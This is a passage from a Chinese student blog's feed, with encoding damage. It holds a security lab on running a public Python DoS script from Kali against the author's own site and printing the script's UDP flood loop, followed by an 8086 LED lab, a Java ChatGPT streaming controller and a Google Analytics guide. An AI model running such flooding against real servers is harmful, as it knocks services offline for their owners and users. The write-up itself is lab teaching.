/etc/apt/sources.list</span><br></pre></td></tr></table></figure></p><p>éƒ¨åˆ†å›½å†…æº:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">å®˜æ–¹æº</span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">ä¸­ç§‘å¤§</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">é˜¿é‡Œäº‘</span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">æ¸…åå¤§å­¦</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">æµ™å¤§</span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">ä¸œè½¯å¤§å­¦</span><br><span class="line">deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line">deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line">é‡åº†å¤§å­¦</span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure></p><p>è‡ªå·±é€‰ä¸€ä¸ªæ¢ä¸Šå°±è¡Œ,ç„¶åè¿›è¡Œæ›´æ–°:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure></p><h4 id="DOSæ”»å‡»"><a href="#DOSæ”»å‡»" class="headerlink" title="DOSæ”»å‡»"></a>DOSæ”»å‡»</h4><p>æœªè¢«æ”»å‡»å‰è®¿é—®æˆ‘çš„ç½‘ç«™æ˜¯è¿™æ ·çš„:</p><p><img src="https://pb01.s3.bitiful.net/75.webp" alt="avatar"></p><p><img src="https://pb01.s3.bitiful.net/76.webp" alt="avatar"></p><p>ä¸‹è½½Dosè„šæœ¬<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Andysun06/ddos</span><br></pre></td></tr></table></figure></p><p><img src="https://pb01.s3.bitiful.net/77.png" alt="avatar"></p><p>è¿›å…¥ddosæ–‡ä»¶å¤¹<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ddos</span><br></pre></td></tr></table></figure></p><p>æ‰§è¡Œpythonè„šæœ¬<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ddos-p3.py</span><br></pre></td></tr></table></figure></p><p>ç»“æœå¦‚ä¸‹,ä¸‹é¢è¿™ä¸¤å¼ ç”¨çš„æ˜¯åˆ«äººçš„å›¾,ä¸æƒ³æ‰“ç äº†(é›¾<br><img src="https://pb01.s3.bitiful.net/78.png" alt="avatar"></p><p><img src="https://pb01.s3.bitiful.net/80.png" alt="avatar"></p><p>åæ­£æˆ‘æ”»å‡»äº†å¤§æ¦‚8åˆ†é’Ÿ,ç½‘ç«™è¿˜æ˜¯å¯ä»¥æ­£å¸¸è®¿é—®çš„,ç”±äºé˜¿é‡Œäº‘æœåŠ¡å™¨æœ‰ä¸€å®šé‡çš„å…è´¹çš„cdné˜²æŠ¤,æˆ‘ä¸ªäººè¿›è¡ŒDOSæ”»å‡»è‡³å°‘éœ€è¦ä¸€å°æ—¶æ‰èƒ½è€—å®Œ.è¿™æ¬¡åªæ˜¯å®éªŒä¸€ä¸‹,æ‰€ä»¥å°±ä¸ç»§ç»­äº†.</p><p><img src="https://pb01.s3.bitiful.net/79.png" alt="avatar"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å—åˆ°æ”»å‡»åæœåŠ¡å™¨çš„å¸¦å®½æ˜¯æœ‰è¢«å¤§é‡æ¶ˆè€—çš„,è¯´æ˜æˆ‘ä»¬çš„æ”»å‡»æ˜¯æœ‰æ•ˆçš„.</p><h4 id="ä»£ç åˆ†æ"><a href="#ä»£ç åˆ†æ" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h4><p>å»ä½œè€…çš„githubä¸ŠæŠŠä»£ç æ‹‰ä¸‹æ¥,çœ‹çœ‹æ˜¯æ€ä¹ˆå†™çš„:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">os.system(<span class="string">&quot;clear&quot;</span>)</span><br><span class="line">os.system(<span class="string">&quot;figlet DDos Attack&quot;</span>)</span><br><span class="line">ip = <span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥ IP     : &quot;</span>)</span><br><span class="line">port = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;æ”»å‡»ç«¯å£      : &quot;</span>))</span><br><span class="line">sd = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;æ”»å‡»é€Ÿåº¦(1~1000) : &quot;</span>))</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;clear&quot;</span>)</span><br><span class="line"></span><br><span class="line">sent = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">     sock.sendto(<span class="built_in">bytes</span>, (ip,port))</span><br><span class="line">     sent = sent + <span class="number">1</span></span><br><span class="line">     <span class="built_in">print</span> (<span class="string">&quot;å·²å‘é€ %s ä¸ªæ•°æ®åŒ…åˆ° %s ç«¯å£ %d&quot;</span>%(sent,ip,port))</span><br><span class="line">     time.sleep((<span class="number">1000</span>-sd)/<span class="number">2000</span>)</span><br></pre></td></tr></table></figure><p>æ ¸å¿ƒä»£ç å°±è¿™ä¹ˆå‡ è¡Œ,å…¶å®å°±æ˜¯ä¸æ–­å‘æŒ‡å®šIPçš„ç«¯å£å‘é€æ•°æ®åŒ…,ç„¶åæ‰“å°å‘é€æ•°æ®åŒ…çš„ä¸ªæ•°.</p>]]></content>
      
      
      <categories>
          
          <category> xdu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®‰å…¨ </tag>
            
            <tag> lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è¥¿ç”µè®¡ç§‘å¾®æœºåŸç†å®éªŒä¸‰</title>
      <link href="/2023/12/11/%E5%BE%AE%E6%9C%BA%E5%8E%9F%E7%90%86%E5%AE%9E%E9%AA%8C3/"/>
      <url>/2023/12/11/%E5%BE%AE%E6%9C%BA%E5%8E%9F%E7%90%86%E5%AE%9E%E9%AA%8C3/</url>
      
        <content type="html"><![CDATA[<h3 id="è¥¿ç”µè®¡ç§‘å¾®æœºåŸç†å®éªŒä¸‰"><a href="#è¥¿ç”µè®¡ç§‘å¾®æœºåŸç†å®éªŒä¸‰" class="headerlink" title="è¥¿ç”µè®¡ç§‘å¾®æœºåŸç†å®éªŒä¸‰"></a>è¥¿ç”µè®¡ç§‘å¾®æœºåŸç†å®éªŒä¸‰</h3><h4 id="å®éªŒè¦æ±‚"><a href="#å®éªŒè¦æ±‚" class="headerlink" title="å®éªŒè¦æ±‚"></a>å®éªŒè¦æ±‚</h4><ol><li>å¼€å…³Yiä¸ºä½ç”µå¹³æ—¶å¯¹åº”çš„å‘å…‰äºŒæç®¡äº®ï¼ŒYiä¸ºé«˜ç”µå¹³æ—¶å¯¹åº”çš„å‘å…‰äºŒæç®¡ç­ã€‚</li><li>å½“å¼€å…³Yiå…¨ä¸ºé«˜ç”µå¹³æ—¶ï¼Œå‘å…‰äºŒæç®¡Qiä»å·¦è‡³å³è½®æµç‚¹äº®ã€‚</li><li>å½“å¼€å…³Yiå…¨ä¸ºä½ç”µå¹³æ—¶ï¼Œå‘å…‰äºŒæç®¡Qiä»å³è‡³å·¦è½®æµç‚¹äº®ã€‚</li><li>è‡ªä¸»è®¾è®¡æ§åˆ¶åŠæ˜¾ç¤ºæ¨¡å¼ï¼Œå®Œæˆç¼–ç¨‹è°ƒè¯•ï¼Œæ¼”ç¤ºå®éªŒç»“æœã€‚</li></ol><p>æˆ‘æ²¡åšè¦æ±‚1,å½“å¼€å…³Yiä¸æ˜¯å…¨ä¸ºä½ç”µå¹³å’Œé«˜ç”µå¹³æ—¶,å‘å…‰äºŒæç®¡QiæŒ‰1423çš„é¡ºåºç‚¹äº®,è¿™é‡Œå¯ä»¥æŒ‰ç…§è‡ªå·±çš„éœ€æ±‚æ”¹,å¯ä»¥æŠŠå‰©ä¸‹çš„å››ä¸ªä¹ŸåŠ ä¸Šå»,é¡ºåºä¹Ÿå¯ä»¥æ”¹,å¦‚æœä½ è¦åšè¦æ±‚1,å¼€å…³Yiä¸ºæŸç‰¹å®šå€¼æ—¶è·³è½¬Lightæ›´å¥½(åœ¨å®éªŒå››ä¸­å®ç°ç±»ä¼¼åŠŸèƒ½)</p><h4 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">IO244equ230h;244</span><br><span class="line">IO273equ230h;273</span><br><span class="line"></span><br><span class="line">_stack segmentstack</span><br><span class="line">       dw 100 DUP(?)</span><br><span class="line">_stackends</span><br><span class="line"></span><br><span class="line">_data segmentword public &#x27;DATA&#x27;</span><br><span class="line">_dataends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">main proc</span><br><span class="line">        assume cs:code,ds:_data,ss:_stack</span><br><span class="line">; åˆå§‹åŒ–å¯„å­˜å™¨</span><br><span class="line">        mov    ax,_data</span><br><span class="line">        mov    ds,ax</span><br><span class="line">        mov    bx,0fefeh</span><br><span class="line">start:  mov    dx,IO244 ; è¯»å–244å¼•è„šçš„è¾“å…¥å€¼</span><br><span class="line">        in     al,dx</span><br><span class="line">        mov    ah,al</span><br><span class="line">        cmp    al,0ffh ; åˆ¤æ–­è¾“å…¥å€¼æ˜¯å¦ä¸º0xffï¼Œå¦‚æœä¸æ˜¯ï¼Œåˆ™è¿›è¡Œç¿»è½¬æ“ä½œ       </span><br><span class="line">        jnz    Next0</span><br><span class="line">        call   ROLeft ; è°ƒç”¨ROLeftå‡½æ•°è¿›è¡Œå·¦ç§»æ“ä½œ</span><br><span class="line">        jmp    Next2</span><br><span class="line">Next0:  cmp    al,0 ; åˆ¤æ–­è¾“å…¥å€¼æ˜¯å¦ä¸º0ï¼Œå¦‚æœä¸æ˜¯ï¼Œè·³è½¬Next1         </span><br><span class="line">        jnz    Next1</span><br><span class="line">        call   RORight </span><br><span class="line">        jmp    Next2</span><br><span class="line">Next1:  call   Light</span><br><span class="line">Next2:  call   Delay</span><br><span class="line">        jmp    start</span><br><span class="line">main endp</span><br><span class="line"></span><br><span class="line">ROLeft procnear</span><br><span class="line">; å·¦ç§»blå¯„å­˜å™¨ï¼Œå¹¶å°†ç»“æœå­˜å‚¨åœ¨alå¯„å­˜å™¨ä¸­</span><br><span class="line">        rol    bl,1</span><br><span class="line">        mov    al,bl</span><br><span class="line">; è¾“å‡ºå·¦ç§»åçš„å€¼åˆ°273å¼•è„š</span><br><span class="line">        mov    dx,IO273</span><br><span class="line">        out    dx,ax</span><br><span class="line">        ret</span><br><span class="line">ROLeft endp</span><br><span class="line"></span><br><span class="line">RORight proc near</span><br><span class="line">; å³ç§»blå¯„å­˜å™¨ï¼Œå¹¶å°†ç»“æœå­˜å‚¨åœ¨alå¯„å­˜å™¨ä¸­</span><br><span class="line">        ror    bl,1</span><br><span class="line">        mov    al,bl</span><br><span class="line">        mov    dx,IO273</span><br><span class="line">        out    dx,ax</span><br><span class="line">        ret</span><br><span class="line">RORight endp</span><br><span class="line"></span><br><span class="line">Light proc near</span><br><span class="line">xor    bh,1  ;bxé«˜å…«ä½ä¸1å¼‚æˆ–</span><br><span class="line">        mov    al,bh</span><br><span class="line">        mov    dx,IO273</span><br><span class="line">        out    dx,ax</span><br><span class="line">call   Delay</span><br><span class="line">xor    bh,8 </span><br><span class="line">        mov    al,bh</span><br><span class="line">        mov    dx,IO273</span><br><span class="line">        out    dx,ax</span><br><span class="line">call   Delay</span><br><span class="line">xor    bh,2 </span><br><span class="line">        mov    al,bh</span><br><span class="line">        mov    dx,IO273</span><br><span class="line">        out    dx,ax</span><br><span class="line">call   Delay</span><br><span class="line">xor    bh,4 </span><br><span class="line">        mov    al,bh</span><br><span class="line">        mov    dx,IO273</span><br><span class="line">        out    dx,ax</span><br><span class="line">call   Delay</span><br><span class="line">        ret</span><br><span class="line">Light endp</span><br><span class="line"></span><br><span class="line">Delay proc near                 </span><br><span class="line">        xor    cx,cx</span><br><span class="line">delay1: loop   delay1</span><br><span class="line">        ret</span><br><span class="line">Delay endp</span><br><span class="line">code ends</span><br><span class="line">ENDmain</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> xdu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æµå¼å¼‚æ­¥å“åº”å®ç°</title>
      <link href="/2023/12/05/2023-12-5-OpenAI-01/"/>
      <url>/2023/12/05/2023-12-5-OpenAI-01/</url>
      
        <content type="html"><![CDATA[<h3 id="æµå¼å¼‚æ­¥å“åº”å®ç°"><a href="#æµå¼å¼‚æ­¥å“åº”å®ç°" class="headerlink" title="æµå¼å¼‚æ­¥å“åº”å®ç°"></a>æµå¼å¼‚æ­¥å“åº”å®ç°</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@RestController()</span>  <span class="comment">//æ³¨è§£ä¸ºRESTæ§åˆ¶å™¨,ä»¥ä¾¿å¤„ç†HTTPè¯·æ±‚å’Œå“åº”</span></span><br><span class="line"><span class="meta">@CrossOrigin(&quot;*&quot;)</span>  <span class="comment">//å…è®¸æ‰€æœ‰è·¨åŸŸè¯·æ±‚</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/api/v1/&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChatGPTAIServiceControllerOld</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> OpenAiSession openAiSession;  </span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> ThreadPoolExecutor threadPoolExecutor;  <span class="comment">//æ³¨å…¥çº¿ç¨‹æ± ,æé«˜å¤„ç†æ•ˆç‡</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;chat/completions&quot;, method = RequestMethod.POST)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseBodyEmitter <span class="title function_">completionsStream</span><span class="params">(<span class="meta">@RequestBody</span> ChatGPTRequestDTO request, <span class="meta">@RequestHeader(&quot;Authorization&quot;)</span> String token, HttpServletResponse response)</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;æµå¼é—®ç­”è¯·æ±‚å¼€å§‹ï¼Œä½¿ç”¨æ¨¡å‹ï¼š&#123;&#125; è¯·æ±‚ä¿¡æ¯ï¼š&#123;&#125;&quot;</span>, request.getModel(), JSON.toJSONString(request.getMessages()));</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 1. è®¾ç½®å“åº”å¤´å‚æ•°ï¼›æµå¼è¾“å‡ºã€UTF-8ã€ç¦ç”¨ç¼“å­˜</span></span><br><span class="line">            response.setContentType(<span class="string">&quot;text/event-stream&quot;</span>);</span><br><span class="line">            response.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">            response.setHeader(<span class="string">&quot;Cache-Control&quot;</span>, <span class="string">&quot;no-cache&quot;</span>);</span><br><span class="line">            <span class="comment">//ç®€å•æ ¡éªŒtoken</span></span><br><span class="line">            <span class="keyword">if</span> (!token.equals(<span class="string">&quot;xxxx&quot;</span>)) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;token err!&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 2. å¼‚æ­¥å¤„ç† HTTP å“åº”å¤„ç†ç±»</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// åˆ›å»ºResponseBodyEmitterå¯¹è±¡ï¼Œè®¾ç½®è¶…æ—¶æ—¶é—´</span></span><br><span class="line">            <span class="type">ResponseBodyEmitter</span> <span class="variable">emitter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResponseBodyEmitter</span>(<span class="number">3</span> * <span class="number">60</span> * <span class="number">1000L</span>);  </span><br><span class="line">            <span class="comment">// è®¾ç½®å®Œæˆå’Œé”™è¯¯äº‹ä»¶çš„å¤„ç†æ–¹æ³•</span></span><br><span class="line">            emitter.onCompletion(() -&gt; &#123;</span><br><span class="line">                log.info(<span class="string">&quot;æµå¼é—®ç­”è¯·æ±‚å®Œæˆï¼Œä½¿ç”¨æ¨¡å‹ï¼š&#123;&#125;&quot;</span>, request.getModel());</span><br><span class="line">            &#125;);</span><br><span class="line">            emitter.onError(throwable -&gt; log.error(<span class="string">&quot;æµå¼é—®ç­”è¯·æ±‚ç–«æƒ…ï¼Œä½¿ç”¨æ¨¡å‹ï¼š&#123;&#125;&quot;</span>, request.getModel(), throwable));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 3.1 æ„å»ºè¯·æ±‚å‚æ•°</span></span><br><span class="line">            List&lt;Message&gt; messages = request.getMessages().stream()  <span class="comment">//è¯·æ±‚å¯¹è±¡ä¸­çš„æ¶ˆæ¯åˆ—è¡¨ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºStreamå¯¹è±¡ã€‚</span></span><br><span class="line">                    .map(entity -&gt; Message.builder()  <span class="comment">//ä½¿ç”¨mapæ–¹æ³•å°†æ¯ä¸ªæ¶ˆæ¯å¯¹è±¡è½¬æ¢ä¸ºä¸€ä¸ªMessage.builderå¯¹è±¡</span></span><br><span class="line">                            .role(Constants.Role.valueOf(entity.getRole().toUpperCase()))  </span><br><span class="line">                            .content(entity.getContent())</span><br><span class="line">                            .name(entity.getName())</span><br><span class="line">                            .build())  <span class="comment">//æ„å»ºå™¨åˆ›å»ºæ–°æ¶ˆæ¯å¯¹è±¡</span></span><br><span class="line">                    .collect(Collectors.toList());<span class="comment">// å°†æ„å»ºå™¨åˆ›å»ºçš„æ¶ˆæ¯å¯¹è±¡åˆ—è¡¨æ”¶é›†åˆ°ä¸€ä¸ªæ–°çš„åˆ—è¡¨ä¸­ï¼Œå¹¶å°†æ–°åˆ—è¡¨èµ‹å€¼ç»™messageså˜é‡</span></span><br><span class="line">            <span class="comment">// æ„å»ºè¯·æ±‚å¯¹è±¡</span></span><br><span class="line">            <span class="type">ChatCompletionRequest</span> <span class="variable">chatCompletion</span> <span class="operator">=</span> ChatCompletionRequest</span><br><span class="line">                    .builder()</span><br><span class="line">                    .stream(<span class="literal">true</span>)</span><br><span class="line">                    .messages(messages)</span><br><span class="line">                    .model(ChatCompletionRequest.Model.GPT_3_5_TURBO.getCode())</span><br><span class="line">                    .build();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 3.2 è¯·æ±‚åº”ç­”</span></span><br><span class="line">            openAiSession.chatCompletions(chatCompletion, <span class="keyword">new</span> <span class="title class_">EventSourceListener</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onEvent</span><span class="params">(<span class="meta">@NotNull</span> EventSource eventSource, <span class="meta">@Nullable</span> String id, <span class="meta">@Nullable</span> String type, <span class="meta">@NotNull</span> String data)</span> &#123;</span><br><span class="line">                    <span class="type">ChatCompletionResponse</span> <span class="variable">chatCompletionResponse</span> <span class="operator">=</span> JSON.parseObject(data, ChatCompletionResponse.class);</span><br><span class="line">                    List&lt;ChatChoice&gt; choices = chatCompletionResponse.getChoices();</span><br><span class="line">                    <span class="keyword">for</span> (ChatChoice chatChoice : choices) &#123;</span><br><span class="line">                        <span class="type">Message</span> <span class="variable">delta</span> <span class="operator">=</span> chatChoice.getDelta();</span><br><span class="line">                        <span class="keyword">if</span> (Constants.Role.ASSISTANT.getCode().equals(delta.getRole())) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// åº”ç­”å®Œæˆ</span></span><br><span class="line">                        <span class="type">String</span> <span class="variable">finishReason</span> <span class="operator">=</span> chatChoice.getFinishReason();</span><br><span class="line">                        <span class="keyword">if</span> (StringUtils.isNoneBlank(finishReason) &amp;&amp; <span class="string">&quot;stop&quot;</span>.equals(finishReason)) &#123;</span><br><span class="line">                            emitter.complete();</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// å‘é€ä¿¡æ¯</span></span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            emitter.send(delta.getContent());  <span class="comment">//å°†å†…å®¹æ·»åŠ åˆ°å“åº”æµä¸­</span></span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">return</span> emitter;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            log.error(<span class="string">&quot;æµå¼åº”ç­”ï¼Œè¯·æ±‚æ¨¡å‹ï¼š&#123;&#125; å‘ç”Ÿå¼‚å¸¸&quot;</span>, request.getModel(), e);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ChatGPTException</span>(e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hexo Butterflyåšå®¢æ·»åŠ Googleåˆ†æ</title>
      <link href="/2023/12/05/%E5%8D%9A%E5%AE%A2%E5%88%86%E6%9E%90/"/>
      <url>/2023/12/05/%E5%8D%9A%E5%AE%A2%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="Hexo-Butterflyåšå®¢æ·»åŠ Googleåˆ†æ"><a href="#Hexo-Butterflyåšå®¢æ·»åŠ Googleåˆ†æ" class="headerlink" title="Hexo Butterflyåšå®¢æ·»åŠ Googleåˆ†æ"></a>Hexo Butterflyåšå®¢æ·»åŠ Googleåˆ†æ</h2><p>è¿›å…¥è°·æ­Œåˆ†æå®˜ç½‘:<a href="https://analytics.google.com/analytics/web/">https://analytics.google.com/analytics/web/</a><br>å¦‚ä¸‹å›¾æ‰€ç¤º:</p><p><img src="https://pb01.s3.bitiful.net/48.png" alt="avatar"></p><p>ç‚¹å‡»å¼€å§‹è¯„ä¼°</p><p><img src="https://pb01.s3.bitiful.net/50.png" alt="avatar"></p><p>è¾“å…¥è´¦æˆ·å,éšä¾¿å¡«å°±è¡Œ,ç‚¹å‡»ä¸‹ä¸€æ­¥</p><p><img src="https://pb01.s3.bitiful.net/51.png" alt="avatar"></p><p>è¾“å…¥å±æ€§åç§°(éšä¾¿å¡«),å¡«ä¸Šä½ çš„åšå®¢åŸŸå,ç‚¹å‡»ä¸‹ä¸€æ­¥</p><p>å‰©ä¸‹çš„æ­¥éª¤æŒ‰è‡ªå·±çš„æƒ…å†µå¡«å°±è¡Œ</p><p>æœ€åä¼šå¼¹å‡ºä¸€ä¸ªå¼¹çª—,ä¸Šé¢ä¼šæœ‰ä¸€ä¸ªè·Ÿè¸ªid,ä¸€èˆ¬ä»¥UAå¼€å¤´,å°†å®ƒå¤åˆ¶ä¸‹æ¥,åœ¨_config.butterfly.ymlæ–‡ä»¶ä¸­æœç´¢google_analytics,åœ¨è¿™ä¸ªåé¢æŠŠä½ çš„è·Ÿè¸ªidå¡«è¿›å»,å¦‚ä¸‹æ‰€ç¤º:</p><p><img src="https://pb01.s3.bitiful.net/52.png" alt="avatar"></p><p>å¦‚æœä½ å°å¿ƒæŠŠè°·æ­Œåˆ†æçš„ç½‘å€å…³äº†,åº”è¯¥æ€ä¹ˆæ‰¾è·Ÿè¸ªidå‘¢?</p><p>è¿›å…¥åå°,ç‚¹å‡»ç®¡ç†:<br><img src="https://pb01.s3.bitiful.net/53.png" alt="avatar"></p><p>æ‰¾åˆ°èµ„æºå­˜å–ç®¡ç†,ç‚¹å‡»:<br><img src="https://pb01.s3.bitiful.net/54.png" 